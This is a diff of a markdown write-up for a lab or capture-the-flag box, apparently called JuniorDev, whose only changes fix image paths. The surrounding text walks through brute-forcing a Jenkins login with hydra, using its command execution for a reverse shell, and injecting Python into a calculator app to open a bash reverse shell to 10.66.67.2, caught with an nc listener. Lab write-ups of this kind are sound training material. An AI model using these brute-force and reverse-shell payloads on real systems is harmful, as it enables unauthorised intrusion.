@@ -41,11 +41,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 # Method to solve the challenge
 In this challenge, we will start of with website on port 30609 instead of the usual port.
 <br>
-![](../assets/img/posts/2022-07-22-JuniorDev-1.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-1.png)
 <br>
 Since it is a login form, we will always start with the basic which is SQL injection and default credentials. After trying both of these, it seems that the login form is not vulnearable to sql injection. As for default credentials, jenkins only provide username `admin` while the password is different for every user. The next method that i had in mind is bruteforcing with `hydra`. It is abit complicated to bruteforce with hydrs we will need to prepared some information.
 <br>
-![](../assets/img/posts/2022-07-22-JuniorDev-2.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-2.png)
 <br>
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
@@ -71,15 +71,15 @@ http-post-form = post request from information gathering in inspection.
 ```
 We managed to found a password which allow us to login into the website. 
 <br>
-![](../assets/img/posts/2022-07-22-JuniorDev-3.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-3.png)
 <br>
 After wondering around with the website, it looks like there is a function which execute command from shell. 
 <br>
-![](../assets/img/posts/2022-07-22-JuniorDev-4.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-4.png)
 <br>
 Since it is possible to execute command, we could make use of it and get a reverse shell.
 <br>
-![](../assets/img/posts/2022-07-22-JuniorDev-5.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-5.png)
 <br>
 After completing everything, build it and a reverse shell should spawn is everything is done correctly.
 ```
@@ -127,14 +127,14 @@ Open 10.150.150.38:30609
 ```
 After wondering around the website and gathering information, it appears that the python script is acting like a calculator that could add things up. 
 <br>
-![](../assets/img/posts/2022-07-22-JuniorDev-6.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-6.png)
 <br>
 After searching for some helps about exploiting python, I came across a useful [website](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) which might help me to get another reverse shell. Since we do not have the source code, the only thing is we try and hope that it works.
 ```
 __import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.67.2/1235 0>&1"')#
 ```
 
-![](../assets/img/posts/2022-07-22-JuniorDev-7.png)
+![](/assets/img/posts/2022-07-22-JuniorDev-7.png)
 
 ```
 nc -nvlp 1235
